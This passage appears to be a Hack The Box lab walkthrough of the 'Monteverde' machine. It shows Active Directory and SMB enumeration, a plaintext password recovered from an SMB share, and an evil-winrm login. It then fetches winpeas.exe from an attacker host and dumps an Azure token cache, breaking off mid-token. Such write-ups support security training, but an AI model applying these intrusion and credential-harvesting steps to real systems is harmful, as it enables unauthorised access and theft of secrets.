+Group: Users&#x27; (RID: 545) has member: Couldn&#x27;t lookup SIDs
+Group: Pre-Windows 2000 Compatible Access&#x27; (RID: 554) has member: Couldn&#x27;t lookup SIDs
+
+[+]  Getting local groups:
+
+group:[Cert Publishers] rid:[0x205]
+group:[RAS and IAS Servers] rid:[0x229]
+group:[Allowed RODC Password Replication Group] rid:[0x23b]
+group:[Denied RODC Password Replication Group] rid:[0x23c]
+group:[DnsAdmins] rid:[0x44d]
+group:[SQLServer2005SQLBrowserUser$MONTEVERDE] rid:[0x44f]
+group:[ADSyncAdmins] rid:[0x451]
+group:[ADSyncOperators] rid:[0x452]
+group:[ADSyncBrowse] rid:[0x453]
+group:[ADSyncPasswordSet] rid:[0x454]
+
+[+]  Getting local group memberships:
+
+Group: ADSyncAdmins&#x27; (RID: 1105) has member: Couldn&#x27;t lookup SIDs
+Group: Denied RODC Password Replication Group&#x27; (RID: 572) has member: Couldn&#x27;t lookup SIDs
+
+[+]  Getting domain groups:
+
+group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
+group:[Domain Users] rid:[0x201]
+group:[Domain Guests] rid:[0x202]
+group:[Domain Computers] rid:[0x203]
+group:[Group Policy Creator Owners] rid:[0x208]
+group:[Cloneable Domain Controllers] rid:[0x20a]
+group:[Protected Users] rid:[0x20d]
+group:[DnsUpdateProxy] rid:[0x44e]
+group:[Azure Admins] rid:[0xa29]
+group:[File Server Admins] rid:[0xa2e]
+group:[Call Recording Admins] rid:[0xa2f]
+group:[Reception] rid:[0xa30]
+group:[Operations] rid:[0xa31]
+group:[Trading] rid:[0xa32]
+group:[HelpDesk] rid:[0xa33]
+group:[Developers] rid:[0xa34]
+
+[+]  Getting domain group memberships:
+
+Group: &#x27;Group Policy Creator Owners&#x27; (RID: 520) has member: MEGABANK\Administrator
+Group: &#x27;Domain Guests&#x27; (RID: 514) has member: MEGABANK\Guest
+Group: &#x27;Operations&#x27; (RID: 2609) has member: MEGABANK\smorgan
+Group: &#x27;HelpDesk&#x27; (RID: 2611) has member: MEGABANK\roleary
+Group: &#x27;Azure Admins&#x27; (RID: 2601) has member: MEGABANK\Administrator
+Group: &#x27;Azure Admins&#x27; (RID: 2601) has member: MEGABANK\AAD_987d7f2f57d2
+Group: &#x27;Azure Admins&#x27; (RID: 2601) has member: MEGABANK\mhope
+Group: &#x27;Trading&#x27; (RID: 2610) has member: MEGABANK\dgalanos
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: MEGABANK\Administrator
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: MEGABANK\krbtgt
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: MEGABANK\AAD_987d7f2f57d2
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: MEGABANK\mhope
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: MEGABANK\SABatchJobs
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: MEGABANK\svc-ata
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: MEGABANK\svc-bexec
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: MEGABANK\svc-netapp
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: MEGABANK\dgalanos
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: MEGABANK\roleary
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: MEGABANK\smorgan
+
+ ==================( Users on 10.10.10.172 via RID cycling (RIDS: 500-550,1000-1050) )==================
+
+
+[E] Couldn&#x27;t get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
+
+
+ ===============================( Getting printer info for 10.10.10.172 )===============================
+
+do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
+
+
+enum4linux complete on Sun Nov 24 18:23:24 2024
+
+</code></pre><h2 id="2a34f0da-7d8f-4994-b76e-c932d4812c17" class="">DNS Enumeration</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6361a7af-8c75-4999-bebc-558e0fd60363" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ gobuster dns -d megabank.local -t 25 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Domain:     megabank.local
+[+] Threads:    25
+[+] Timeout:    1s
+[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+===============================================================
+Starting gobuster in DNS enumeration mode
+===============================================================
+Progress: 19966 / 19967 (99.99%)
+===============================================================
+Finished
+===============================================================
+
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="32300596-bd69-4967-9866-de725839eb70" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ gobuster dns -d megabank.local -t 25 -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Domain:     megabank.local
+[+] Threads:    25
+[+] Timeout:    1s
+[+] Wordlist:   /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
+===============================================================
+Starting gobuster in DNS enumeration mode
+===============================================================
+Progress: 100000 / 100001 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+</code></pre><p id="6dfc8009-5c19-44a5-ab2e-02ded490be88" class="">
+</p><p id="df47ce31-a7cc-4e12-9a3b-67f42e2798f7" class="">
+</p><h2 id="816145da-8266-4cf2-9fcd-8ef46fdead9f" class="">Findings</h2><ul id="3a317bd3-9904-40c0-a32e-81b06eb275df" class="bulleted-list"><li style="list-style-type:disc">AD<ul id="148d1b9f-8847-80ef-8745-d63c26f48b44" class="bulleted-list"><li style="list-style-type:circle">Domain: MEGABANK.LOCAL</li></ul><ul id="148d1b9f-8847-8005-a525-e204b72336aa" class="bulleted-list"><li style="list-style-type:circle">Usernames: administrator, guest, krbtgt, domain admins, root, bin, none<ul id="148d1b9f-8847-8050-adaa-f150609b47b0" class="bulleted-list"><li style="list-style-type:square">Account: AAD_987d7f2f57d2	Name: AAD_987d7f2f57d2	Desc: Service account for the Synchronization Service</li></ul><ul id="148d1b9f-8847-80fa-b09d-c3a95aff518c" class="bulleted-list"><li style="list-style-type:square">Account: dgalanos	Name: Dimitris Galanos</li></ul><ul id="148d1b9f-8847-8024-a1df-f04bf00411b3" class="bulleted-list"><li style="list-style-type:square">Account: mhope	Name: Mike Hope</li></ul><ul id="148d1b9f-8847-808c-97b6-f7da7cebe9fa" class="bulleted-list"><li style="list-style-type:square">Account: roleary	Name: Ray O&#x27;Leary</li></ul><ul id="148d1b9f-8847-80f2-8a32-d0b6f6db3c7e" class="bulleted-list"><li style="list-style-type:square">Account: SABatchJobs	Name: SABatchJobs</li></ul><ul id="148d1b9f-8847-8026-8a3c-ef3420fab47d" class="bulleted-list"><li style="list-style-type:square">Account: smorgan	Name: Sally Morgan</li></ul></li></ul></li></ul><p id="ee2b3045-5456-48f5-a01e-46a85a67dbf0" class="">
+</p><p id="212adfd5-c97e-4bac-962d-f385f751a186" class="">
+</p><h1 id="81ff0290-5a68-4898-8e68-6d5cffe2336c" class="">User</h1><p id="8cf28eb1-72fc-436e-a6a4-3a2ec09888ca" class="">User files</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="149d1b9f-8847-8036-b586-d943358eeab8" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ smbclient -U &#x27;SABatchJobs&#x27; \\\\10.10.10.172\\users$
+Password for [WORKGROUP\SABatchJobs]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Fri Jan  3 08:12:48 2020
+  ..                                  D        0  Fri Jan  3 08:12:48 2020
+  dgalanos                            D        0  Fri Jan  3 08:12:30 2020
+  mhope                               D        0  Fri Jan  3 08:41:18 2020
+  roleary                             D        0  Fri Jan  3 08:10:30 2020
+  smorgan                             D        0  Fri Jan  3 08:10:24 2020
+
+		31999 blocks of size 4096. 28979 blocks available
+smb: \&gt; cd dgalanos
+smb: \dgalanos\&gt; ls
+  .                                   D        0  Fri Jan  3 08:12:30 2020
+  ..                                  D        0  Fri Jan  3 08:12:30 2020
+
+		31999 blocks of size 4096. 28979 blocks available
+smb: \dgalanos\&gt; cd ..
+smb: \&gt; cd mhope
+smb: \mhope\&gt; ls
+  .                                   D        0  Fri Jan  3 08:41:18 2020
+  ..                                  D        0  Fri Jan  3 08:41:18 2020
+  azure.xml                          AR     1212  Fri Jan  3 08:40:23 2020
+
+		31999 blocks of size 4096. 28979 blocks available
+smb: \mhope\&gt; cat azure.xml
+cat: command not found
+smb: \mhope\&gt; type azure.xml
+type: command not found
+smb: \mhope\&gt; get azure.xml  
+getting file \mhope\azure.xml of size 1212 as azure.xml (2,8 KiloBytes/sec) (average 2,8 KiloBytes/sec)
+smb: \mhope\&gt; cd ..
+smb: \&gt; ls
+  .                                   D        0  Fri Jan  3 08:12:48 2020
+  ..                                  D        0  Fri Jan  3 08:12:48 2020
+  dgalanos                            D        0  Fri Jan  3 08:12:30 2020
+  mhope                               D        0  Fri Jan  3 08:41:18 2020
+  roleary                             D        0  Fri Jan  3 08:10:30 2020
+  smorgan                             D        0  Fri Jan  3 08:10:24 2020
+
+		31999 blocks of size 4096. 28979 blocks available
+smb: \&gt; cd roleary
+smb: \roleary\&gt; ls
+  .                                   D        0  Fri Jan  3 08:10:30 2020
+  ..                                  D        0  Fri Jan  3 08:10:30 2020
+
+		31999 blocks of size 4096. 28979 blocks available
+smb: \roleary\&gt; cd ..
+smb: \&gt; cd smorgan
+smb: \smorgan\&gt; ls
+  .                                   D        0  Fri Jan  3 08:10:24 2020
+  ..                                  D        0  Fri Jan  3 08:10:24 2020
+
+		31999 blocks of size 4096. 28979 blocks available
+</code></pre><p id="453b1d41-50df-4051-8d12-0cd42e1850e0" class="">Keys and Credentials</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="149d1b9f-8847-8091-93f1-e073f0bbd85e" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ cat azure.xml                          
+��&lt;Objs Version=&quot;1.1.0.1&quot; xmlns=&quot;http://schemas.microsoft.com/powershell/2004/04&quot;&gt;
+  &lt;Obj RefId=&quot;0&quot;&gt;
+    &lt;TN RefId=&quot;0&quot;&gt;
+      &lt;T&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/T&gt;
+      &lt;T&gt;System.Object&lt;/T&gt;
+    &lt;/TN&gt;
+    &lt;ToString&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/ToString&gt;
+    &lt;Props&gt;
+      &lt;DT N=&quot;StartDate&quot;&gt;2020-01-03T05:35:00.7562298-08:00&lt;/DT&gt;
+      &lt;DT N=&quot;EndDate&quot;&gt;2054-01-03T05:35:00.7562298-08:00&lt;/DT&gt;
+      &lt;G N=&quot;KeyId&quot;&gt;00000000-0000-0000-0000-000000000000&lt;/G&gt;
+      &lt;S N=&quot;Password&quot;&gt;4n0therD4y@n0th3r$&lt;/S&gt;
+    &lt;/Props&gt;
+  &lt;/Obj&gt;
+&lt;/Objs&gt;     </code></pre><p id="41c2c555-0d18-4d96-ac6a-b4abd967d45c" class="">Connect with evilwinrm → <a href="https://www.notion.so/eCPPT-Preparation-bc633b6c72504a8cbd37b48288912b92?pvs=21">https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm</a></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="149d1b9f-8847-8042-a780-ca7b84096287" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ evil-winrm -i 10.10.10.172 -u mhope -p &#x27;4n0therD4y@n0th3r$&#x27;         
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\mhope\Documents&gt; 
+*Evil-WinRM* PS C:\Users\mhope\Desktop&gt; type user.txt
+8*******************************7
+
+</code></pre><p id="512edbec-8049-4b6f-9fd8-588887b24ed1" class="">
+</p><h1 id="dd2709d4-9205-47d4-b48f-2facc7b2a09f" class="">Root</h1><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="149d1b9f-8847-80a6-ab5e-ca6302ff12a1" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">*Evil-WinRM* PS C:\Users\mhope\Desktop&gt; Get-ADUser -Filter *
+
+
+DistinguishedName : CN=Administrator,CN=Users,DC=MEGABANK,DC=LOCAL
+Enabled           : True
+GivenName         :
+Name              : Administrator
+ObjectClass       : user
+ObjectGUID        : d5154700-9416-41a8-bc52-8f4c343e31ed
+SamAccountName    : Administrator
+SID               : S-1-5-21-391775091-850290835-3566037492-500
+Surname           :
+UserPrincipalName :
+
+DistinguishedName : CN=Guest,CN=Users,DC=MEGABANK,DC=LOCAL
+Enabled           : False
+GivenName         :
+Name              : Guest
+ObjectClass       : user
+ObjectGUID        : 6231e96d-a7c9-405b-8d9a-2dc81d6faf1c
+SamAccountName    : Guest
+SID               : S-1-5-21-391775091-850290835-3566037492-501
+Surname           :
+UserPrincipalName :
+
+DistinguishedName : CN=krbtgt,CN=Users,DC=MEGABANK,DC=LOCAL
+Enabled           : False
+GivenName         :
+Name              : krbtgt
+ObjectClass       : user
+ObjectGUID        : 83c1d7c2-f972-4a87-b30e-e1f305c7922e
+SamAccountName    : krbtgt
+SID               : S-1-5-21-391775091-850290835-3566037492-502
+Surname           :
+UserPrincipalName :
+
+DistinguishedName : CN=AAD_987d7f2f57d2,CN=Users,DC=MEGABANK,DC=LOCAL
+Enabled           : True
+GivenName         :
+Name              : AAD_987d7f2f57d2
+ObjectClass       : user
+ObjectGUID        : e6df07c3-7fb1-4869-83ac-d6a19918234b
+SamAccountName    : AAD_987d7f2f57d2
+SID               : S-1-5-21-391775091-850290835-3566037492-1104
+Surname           :
+UserPrincipalName :
+
+DistinguishedName : CN=Mike Hope,OU=London,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
+Enabled           : True
+GivenName         : Mike
+Name              : Mike Hope
+ObjectClass       : user
+ObjectGUID        : bcdb6ff9-0edd-453e-a659-6ba9a21a1827
+SamAccountName    : mhope
+SID               : S-1-5-21-391775091-850290835-3566037492-1601
+Surname           : Hope
+UserPrincipalName : mhope@MEGABANK.LOCAL
+
+DistinguishedName : CN=SABatchJobs,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
+Enabled           : True
+GivenName         : SABatchJobs
+Name              : SABatchJobs
+ObjectClass       : user
+ObjectGUID        : e0006803-f029-47bf-872b-6f48e0610c2d
+SamAccountName    : SABatchJobs
+SID               : S-1-5-21-391775091-850290835-3566037492-2602
+Surname           :
+UserPrincipalName : SABatchJobs@MEGABANK.LOCAL
+
+DistinguishedName : CN=svc-ata,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
+Enabled           : True
+GivenName         : svc-ata
+Name              : svc-ata
+ObjectClass       : user
+ObjectGUID        : 5894a27f-d630-46b5-8767-f4c04123995f
+SamAccountName    : svc-ata
+SID               : S-1-5-21-391775091-850290835-3566037492-2603
+Surname           :
+UserPrincipalName : svc-ata@MEGABANK.LOCAL
+
+DistinguishedName : CN=svc-bexec,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
+Enabled           : True
+GivenName         : svc-bexec
+Name              : svc-bexec
+ObjectClass       : user
+ObjectGUID        : 9efa5492-03fd-4b87-9fad-b25770bdb54c
+SamAccountName    : svc-bexec
+SID               : S-1-5-21-391775091-850290835-3566037492-2604
+Surname           :
+UserPrincipalName : svc-bexec@MEGABANK.LOCAL
+
+DistinguishedName : CN=svc-netapp,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
+Enabled           : True
+GivenName         : svc-netapp
+Name              : svc-netapp
+ObjectClass       : user
+ObjectGUID        : f48a1bd2-6647-4f19-8b04-02576ac86336
+SamAccountName    : svc-netapp
+SID               : S-1-5-21-391775091-850290835-3566037492-2605
+Surname           :
+UserPrincipalName : svc-netapp@MEGABANK.LOCAL
+
+DistinguishedName : CN=Dimitris Galanos,OU=Athens,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
+Enabled           : True
+GivenName         : Dimitris
+Name              : Dimitris Galanos
+ObjectClass       : user
+ObjectGUID        : 8cc2d53d-a23e-4b53-8150-9cb16b883f14
+SamAccountName    : dgalanos
+SID               : S-1-5-21-391775091-850290835-3566037492-2613
+Surname           : Galanos
+UserPrincipalName : dgalanos@MEGABANK.LOCAL
+
+DistinguishedName : CN=Ray O&#x27;Leary,OU=Toronto,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
+Enabled           : True
+GivenName         : Ray
+Name              : Ray O&#x27;Leary
+ObjectClass       : user
+ObjectGUID        : e25b31dc-ea24-4a0e-8b21-21bdd9536b1f
+SamAccountName    : roleary
+SID               : S-1-5-21-391775091-850290835-3566037492-2614
+Surname           : O&#x27;Leary
+UserPrincipalName : roleary@MEGABANK.LOCAL
+
+DistinguishedName : CN=Sally Morgan,OU=New York,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
+Enabled           : True
+GivenName         : Sally
+Name              : Sally Morgan
+ObjectClass       : user
+ObjectGUID        : d521ad17-c350-4592-a5fc-2f1ef1b397b9
+SamAccountName    : smorgan
+SID               : S-1-5-21-391775091-850290835-3566037492-2615
+Surname           : Morgan
+UserPrincipalName : smorgan@MEGABANK.LOCAL
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="149d1b9f-8847-80aa-b7a9-faae732c2bfc" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">*Evil-WinRM* PS C:\Users\mhope\Desktop&gt; net user mhope
+User name                    mhope
+Full Name                    Mike Hope
+Comment
+User&#x27;s comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/2/2020 3:40:05 PM
+Password expires             Never
+Password changeable          1/3/2020 3:40:05 PM
+Password required            Yes
+User may change password     No
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory               \\monteverde\users$\mhope
+Last logon                   11/24/2024 5:15:34 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Azure Admins         *Domain Users
+The command completed successfully.
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="149d1b9f-8847-8072-9aa4-d8871765f343" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">*Evil-WinRM* PS C:\Users\mhope\Desktop&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+</code></pre><p id="149d1b9f-8847-8059-89e2-e85383b76d30" class="">Executing winpeas.exe</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="149d1b9f-8847-80af-b44f-c07895699ebb" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">*Evil-WinRM* PS C:\Users\mhope\Desktop&gt; powershell -c wget http://10.10.14.10:8000/winpeas.exe -Outfile winpeas.exe
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings
+    PowerShell v2 Version: 2.0
+    PowerShell v5 Version: 5.1.17763.1
+    PowerShell Core Version: 
+    Transcription Settings: 
+    Module Logging Settings: 
+    Scriptblock Logging Settings: 
+    PS history file: 
+    PS history size:
+    
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Drives Information
+È Remember that you should search more info inside the other drives 
+    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 3 GB)(Permissions: Users [AppendData/CreateDirectories])
+    E:\ (Type: Fixed)(Volume label: Data)(Filesystem: NTFS)(Available space: 0 GB)(Permissions: Users [AppendData/CreateDirectories])
+
+
+Folder: C:\Users\mhope\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+    FolderPerms: mhope [AllAccess]
+    File: C:\Users\mhope\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)
+    FilePerms: mhope [AllAccess]
+
+
+https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Cloud Credentials
+È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
+    C:\Users\mhope\.azure\TokenCache.dat (Azure Token Cache)
+    Accessed:1/3/2020 5:36:14 AM -- Size:7896
+
+    C:\Users\mhope\.azure\AzureRMContext.json (Azure RM Context)
+    Accessed:1/3/2020 5:35:57 AM -- Size:2794
+
+</code></pre><p id="149d1b9f-8847-8069-a415-c44014e878e2" class="">
+</p><p id="149d1b9f-8847-8064-bedc-cbe7b77689b4" class="">tokencache.dat and azurermcontext.json</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="149d1b9f-8847-80cf-bed6-f6965929a0e5" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">&#x27;C:\Users\mhope\.Azure\TokenCache.dat&#x27; - content:
+?https://login.windows.net/372efea9-7bc4-4b76-8839-984b45edfb98/:::https://graph.windows.net/:::1950a258-227b-4e31-a9cf-717495945fc2:::0?{&quot;RefreshToken&quot;:&quot;AQABAAAAAACQN9QBRU3jT6bcBQLZNUj7aeQ8R2hfsMQE-DIEEp8rOWPiom2rNwROtUThYh6cCyfB9McL8XdHR94VQSY3KAN-SWuINLqSnI_Lfj-vM1nsCu_Kh51XTceMlWr9mZsNYiX5oCnIBT50bCWIlyeZxmpR7L4sfRp_2iESLU06U0QiHBP7L_HR75crAfpQdJ2oJEn9MWYoxFKIHxXRgAp8fwyKa5yVo5usuanLFGofYzvU6YUGwSFwHskyy_iHdmimggyI7pxp2-C0pSlRp6yZp-4JYyvoeTjxqtXkpMR7VnmJ5qIqJvecNcutXPu-SJDWRvvmW_V2se4V1u1ecuJDe02oAmouL7yp8HrcOBNgn9Jg_f27tHJSbONR-rFWFmeYr-Zi84EJbubYBb7DdzZaoCArbYrgglrAOmz85N9-DMbIJdT7ffteT0hu2rHI6OVDvgckNv-XVhwMF55XtjxxxhpR1EljIq07qCPCqSVoNnoyhDawgyYiNRh0EVr1kf6GEA9bAYNMHgf3VN5WApXbb0VzoxozBKNkNiMybB-uA1d9DLs1eOimxrhoKjsK6cyKTsslGe8qgjcLS0pcRDVvNub1_fKQAXqVB4WZXMo_TDSALh-ctiwVVFNRqTeGsdzcfJe7j3WwzuIiuWfIYydSQKaeRo87qtg6v4dHy4hVBOwm-NPah29sOrSNsyuUydhkNK2QXCwn_hV5-7OCwfSJHG9Dja4r8B_iS0-VvcwzRUT_-2t1eNN8vgRgTlgAdotG330U9SshDgVjg27VHIw-e-57ID7FTEjnVfc4loRNjoNJlSAA&quot;,&quot;ResourceIn